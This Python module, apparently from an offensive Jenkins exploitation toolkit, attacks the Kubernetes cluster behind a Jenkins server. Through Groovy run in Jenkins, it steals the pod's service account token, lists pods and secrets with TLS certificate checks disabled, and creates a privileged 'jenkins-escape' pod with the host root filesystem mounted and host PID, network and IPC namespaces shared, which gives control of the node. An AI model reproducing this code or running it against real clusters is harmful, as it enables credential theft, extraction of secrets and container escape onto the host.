"""Kubernetes cluster breakout and privilege escalation.

Detects Kubernetes service account tokens and exploits them for cluster
enumeration, secret extraction, and container escape via privileged pods.
"""

import json
from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class K8sServiceAccount:
    """Kubernetes service account information."""
    token: str
    namespace: str
    ca_cert: Optional[str] = None
    api_server: str = "https://kubernetes.default.svc"


@dataclass
class K8sResource:
    """Kubernetes resource metadata."""
    kind: str
    name: str
    namespace: str
    data: dict[str, Any]


class KubernetesBreakout:
    """Kubernetes cluster breakout and escalation utilities."""

    SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    SA_NAMESPACE_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    SA_CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

    def __init__(self, session: Any):
        """Initialize Kubernetes breakout module.

        Args:
            session: Authenticated Jenkins session for Groovy execution
        """
        self.session = session
        self.service_account: Optional[K8sServiceAccount] = None

    def check_environment(self) -> bool:
        """Check if running in Kubernetes environment.

        Returns:
            True if Kubernetes service account is detected
        """
        groovy_code = f"""
def tokenFile = new File('{self.SA_TOKEN_PATH}')
println tokenFile.exists()
"""
        result = self.session.execute_groovy(groovy_code)
        return "true" in result.lower()

    def extract_service_account(self) -> Optional[K8sServiceAccount]:
        """Extract Kubernetes service account credentials.

        Returns:
            K8sServiceAccount object if successful, None otherwise
        """
        groovy_code = f"""
def tokenFile = new File('{self.SA_TOKEN_PATH}')
def namespaceFile = new File('{self.SA_NAMESPACE_PATH}')
def caFile = new File('{self.SA_CA_PATH}')

if (!tokenFile.exists()) {{
    println "NO_TOKEN"
    return
}}

def token = tokenFile.text.trim()
def namespace = namespaceFile.exists() ? namespaceFile.text.trim() : "default"
def ca = caFile.exists() ? caFile.text : ""

println "TOKEN:" + token
println "NAMESPACE:" + namespace
println "CA_CERT_LENGTH:" + ca.length()
"""

        result = self.session.execute_groovy(groovy_code)

        if "NO_TOKEN" in result:
            return None

        lines = result.strip().split('\n')
        token = None
        namespace = "default"

        for line in lines:
            if line.startswith("TOKEN:"):
                token = line.split("TOKEN:", 1)[1].strip()
            elif line.startswith("NAMESPACE:"):
                namespace = line.split("NAMESPACE:", 1)[1].strip()

        if token:
            self.service_account = K8sServiceAccount(
                token=token,
                namespace=namespace
            )
            return self.service_account

        return None

    def enumerate_pods(self) -> list[K8sResource]:
        """Enumerate pods in the namespace.

        Returns:
            List of K8sResource objects representing pods
        """
        if not self.service_account:
            return []

        groovy_code = f"""
import java.net.HttpURLConnection
import java.net.URL

def apiServer = "{self.service_account.api_server}"
def namespace = "{self.service_account.namespace}"
def token = "{self.service_account.token}"

def url = new URL(apiServer + "/api/v1/namespaces/" + namespace + "/pods")
def conn = url.openConnection()
conn.setRequestMethod("GET")
conn.setRequestProperty("Authorization", "Bearer " + token)
conn.setRequestProperty("Accept", "application/json")

conn.setHostnameVerifier({{ hostname, session -> true }})
def sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
sslContext.init(null, [new javax.net.ssl.X509TrustManager() {{
    void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    java.security.cert.X509Certificate[] getAcceptedIssuers() {{ return null }}
}}] as javax.net.ssl.TrustManager[], new java.security.SecureRandom())
((javax.net.ssl.HttpsURLConnection)conn).setSSLSocketFactory(sslContext.getSocketFactory())

try {{
    def responseCode = conn.getResponseCode()
    if (responseCode == 200) {{
        def response = conn.getInputStream().text
        println response
    }} else {{
        println "ERROR:" + responseCode + ":" + conn.getErrorStream()?.text
    }}
}} catch (Exception e) {{
    println "EXCEPTION:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        pods = []
        try:
            if not result.startswith("ERROR") and not result.startswith("EXCEPTION"):
                data = json.loads(result)
                for item in data.get("items", []):
                    pods.append(K8sResource(
                        kind="Pod",
                        name=item["metadata"]["name"],
                        namespace=item["metadata"]["namespace"],
                        data=item
                    ))
        except json.JSONDecodeError:
            pass

        return pods

    def enumerate_secrets(self) -> list[K8sResource]:
        """Enumerate secrets in the namespace.

        Returns:
            List of K8sResource objects representing secrets
        """
        if not self.service_account:
            return []

        groovy_code = f"""
import java.net.HttpURLConnection
import java.net.URL

def apiServer = "{self.service_account.api_server}"
def namespace = "{self.service_account.namespace}"
def token = "{self.service_account.token}"

def url = new URL(apiServer + "/api/v1/namespaces/" + namespace + "/secrets")
def conn = url.openConnection()
conn.setRequestMethod("GET")
conn.setRequestProperty("Authorization", "Bearer " + token)
conn.setRequestProperty("Accept", "application/json")

conn.setHostnameVerifier({{ hostname, session -> true }})
def sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
sslContext.init(null, [new javax.net.ssl.X509TrustManager() {{
    void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    java.security.cert.X509Certificate[] getAcceptedIssuers() {{ return null }}
}}] as javax.net.ssl.TrustManager[], new java.security.SecureRandom())
((javax.net.ssl.HttpsURLConnection)conn).setSSLSocketFactory(sslContext.getSocketFactory())

try {{
    def responseCode = conn.getResponseCode()
    if (responseCode == 200) {{
        def response = conn.getInputStream().text
        println response
    }} else {{
        println "ERROR:" + responseCode
    }}
}} catch (Exception e) {{
    println "EXCEPTION:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        secrets = []
        try:
            if not result.startswith("ERROR") and not result.startswith("EXCEPTION"):
                data = json.loads(result)
                for item in data.get("items", []):
                    secrets.append(K8sResource(
                        kind="Secret",
                        name=item["metadata"]["name"],
                        namespace=item["metadata"]["namespace"],
                        data=item
                    ))
        except json.JSONDecodeError:
            pass

        return secrets

    def check_pod_create_permission(self) -> bool:
        """Check if service account can create pods.

        Returns:
            True if pod creation is allowed
        """
        if not self.service_account:
            return False

        groovy_code = f"""
import java.net.HttpURLConnection
import java.net.URL

def apiServer = "{self.service_account.api_server}"
def namespace = "{self.service_account.namespace}"
def token = "{self.service_account.token}"

def selfReview = '''{{
  "kind": "SelfSubjectAccessReview",
  "apiVersion": "authorization.k8s.io/v1",
  "spec": {{
    "resourceAttributes": {{
      "namespace": "{self.service_account.namespace}",
      "verb": "create",
      "resource": "pods"
    }}
  }}
}}'''

def url = new URL(apiServer + "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews")
def conn = url.openConnection()
conn.setRequestMethod("POST")
conn.setRequestProperty("Authorization", "Bearer " + token)
conn.setRequestProperty("Content-Type", "application/json")
conn.setDoOutput(true)

conn.setHostnameVerifier({{ hostname, session -> true }})
def sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
sslContext.init(null, [new javax.net.ssl.X509TrustManager() {{
    void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    java.security.cert.X509Certificate[] getAcceptedIssuers() {{ return null }}
}}] as javax.net.ssl.TrustManager[], new java.security.SecureRandom())
((javax.net.ssl.HttpsURLConnection)conn).setSSLSocketFactory(sslContext.getSocketFactory())

try {{
    conn.getOutputStream().write(selfReview.getBytes("UTF-8"))
    def responseCode = conn.getResponseCode()
    if (responseCode == 201 || responseCode == 200) {{
        def response = conn.getInputStream().text
        println response
    }} else {{
        println "ERROR:" + responseCode
    }}
}} catch (Exception e) {{
    println "EXCEPTION:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        try:
            if not result.startswith("ERROR") and not result.startswith("EXCEPTION"):
                data = json.loads(result)
                return data.get("status", {}).get("allowed", False)
        except json.JSONDecodeError:
            pass

        return False

    def create_privileged_pod(self, pod_name: str = "jenkins-escape",
                            image: str = "alpine:latest",
                            command: Optional[list[str]] = None) -> tuple[bool, str]:
        """Create a privileged pod with host filesystem mounted.

        Args:
            pod_name: Name for the escape pod
            image: Container image to use
            command: Optional command to execute in container

        Returns:
            Tuple of (success, message)
        """
        if not self.service_account:
            return False, "No service account available"

        if not command:
            command = ["sleep", "3600"]

        command_json = json.dumps(command)

        pod_spec = f"""{{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {{
    "name": "{pod_name}",
    "namespace": "{self.service_account.namespace}"
  }},
  "spec": {{
    "hostPID": true,
    "hostNetwork": true,
    "hostIPC": true,
    "containers": [
      {{
        "name": "escape",
        "image": "{image}",
        "command": {command_json},
        "securityContext": {{
          "privileged": true
        }},
        "volumeMounts": [
          {{
            "name": "host",
            "mountPath": "/host"
          }}
        ]
      }}
    ],
    "volumes": [
      {{
        "name": "host",
        "hostPath": {{
          "path": "/"
        }}
      }}
    ]
  }}
}}"""

        groovy_code = f"""
import java.net.HttpURLConnection
import java.net.URL

def apiServer = "{self.service_account.api_server}"
def namespace = "{self.service_account.namespace}"
def token = "{self.service_account.token}"

def podSpec = '''{pod_spec}'''

def url = new URL(apiServer + "/api/v1/namespaces/" + namespace + "/pods")
def conn = url.openConnection()
conn.setRequestMethod("POST")
conn.setRequestProperty("Authorization", "Bearer " + token)
conn.setRequestProperty("Content-Type", "application/json")
conn.setDoOutput(true)

conn.setHostnameVerifier({{ hostname, session -> true }})
def sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
sslContext.init(null, [new javax.net.ssl.X509TrustManager() {{
    void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {{}}
    java.security.cert.X509Certificate[] getAcceptedIssuers() {{ return null }}
}}] as javax.net.ssl.TrustManager[], new java.security.SecureRandom())
((javax.net.ssl.HttpsURLConnection)conn).setSSLSocketFactory(sslContext.getSocketFactory())

try {{
    conn.getOutputStream().write(podSpec.getBytes("UTF-8"))
    def responseCode = conn.getResponseCode()
    if (responseCode == 201) {{
        println "SUCCESS:Pod created successfully"
    }} else {{
        println "ERROR:" + responseCode + ":" + conn.getErrorStream()?.text
    }}
}} catch (Exception e) {{
    println "EXCEPTION:" + e.message
}}
"""

        result = self.session.execute_groovy(groovy_code)

        if result.startswith("SUCCESS"):
            return True, f"Privileged pod '{pod_name}' created. Access with: kubectl exec -it {pod_name} -- /bin/sh"
        else:
            return False, result


def check_k8s_environment(session: Any) -> bool:
    """Quick check if running in Kubernetes.

    Args:
        session: Jenkins session

    Returns:
        True if Kubernetes environment detected
    """
    breakout = KubernetesBreakout(session)
    return breakout.check_environment()


def enumerate_k8s_resources(session: Any) -> dict[str, list[K8sResource]]:
    """Enumerate all accessible Kubernetes resources.

    Args:
        session: Jenkins session

    Returns:
        Dictionary with 'pods' and 'secrets' keys
    """
    breakout = KubernetesBreakout(session)
    breakout.extract_service_account()

    return {
        "pods": breakout.enumerate_pods(),
        "secrets": breakout.enumerate_secrets()
    }


def create_privileged_pod(session: Any, pod_name: str = "jenkins-escape") -> tuple[bool, str]:
    """Create privileged escape pod.

    Args:
        session: Jenkins session
        pod_name: Name for the pod

    Returns:
        Tuple of (success, message)
    """
    breakout = KubernetesBreakout(session)
    breakout.extract_service_account()

    if not breakout.check_pod_create_permission():
        return False, "Service account lacks pod creation permissions"

    return breakout.create_privileged_pod(pod_name)
